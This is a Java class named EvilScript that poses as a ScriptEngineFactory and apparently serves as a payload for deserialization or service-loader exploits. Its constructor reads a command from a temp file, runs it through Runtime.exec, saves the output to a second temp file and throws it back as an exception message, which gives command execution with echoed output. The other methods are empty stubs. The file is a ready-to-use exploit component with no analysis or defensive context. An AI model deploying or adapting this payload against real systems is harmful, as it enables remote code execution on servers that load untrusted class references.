import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;

public class EvilScript implements ScriptEngineFactory {

  public EvilScript() throws Throwable {
    StringBuilder stringBuilder = new StringBuilder();
    try {
      String tmp = System.getProperty("java.io.tmpdir");
      String inputFile = tmp + File.separator + "jabdhjabdjkandaldlanaklndkand.txt";
      String outputFile = tmp + File.separator + "jfkdjkadnkladmknjknfkjnadkad.txt";
      InputStream inputStream = Runtime.getRuntime().exec(new String(Files.readAllBytes(Paths.get(inputFile))).split(" ")).getInputStream();
      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
      String line;
      while((line = bufferedReader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
      }
      if (Files.exists(Paths.get(outputFile)))
        Files.delete(Paths.get(outputFile));

      Files.write(Paths.get(outputFile), stringBuilder.toString().getBytes());
    } catch (Throwable e) {
      e.printStackTrace();
    }
    throw new Throwable(stringBuilder.toString());
  }

  @Override
  public String getEngineName() {
    return null;
  }

  @Override
  public String getEngineVersion() {
    return null;
  }

  @Override
  public List<String> getExtensions() {
    return null;
  }

  @Override
  public List<String> getMimeTypes() {
    return null;
  }

  @Override
  public List<String> getNames() {
    return null;
  }

  @Override
  public String getLanguageName() {
    return null;
  }

  @Override
  public String getLanguageVersion() {
    return null;
  }

  @Override
  public Object getParameter(String key) {
    return null;
  }

  @Override
  public String getMethodCallSyntax(String obj, String m, String... args) {
    return null;
  }

  @Override
  public String getOutputStatement(String toDisplay) {
    return null;
  }

  @Override
  public String getProgram(String... statements) {
    return null;
  }

  @Override
  public ScriptEngine getScriptEngine() {
    return null;
  }
}
